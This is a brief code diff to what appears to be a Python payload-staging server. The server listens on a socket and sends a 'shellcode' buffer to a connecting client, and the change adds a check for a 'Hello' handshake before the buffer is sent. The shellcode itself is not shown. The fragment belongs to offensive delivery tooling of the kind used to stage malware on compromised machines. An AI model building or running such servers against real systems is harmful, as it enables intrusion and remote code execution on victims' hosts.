@@ -24,8 +24,10 @@ s.listen(5)
 print(f"Socket is listening: Port {PORT}")
 while True:
     conn, addr = s.accept()
-    print(f"Connection from {addr[0]} (Port: {addr[1]})")
-    conn.sendall(shellcode)
-    conn.close()
-    print(f"Shellcode sent")
-    break
+    data = conn.recv(1024)
+    if data == b'Hello\x00':
+        print(f"Connection from {addr[0]} (Port: {addr[1]})")
+        conn.sendall(shellcode)
+        conn.close()
+        print(f"Shellcode sent")
+        break
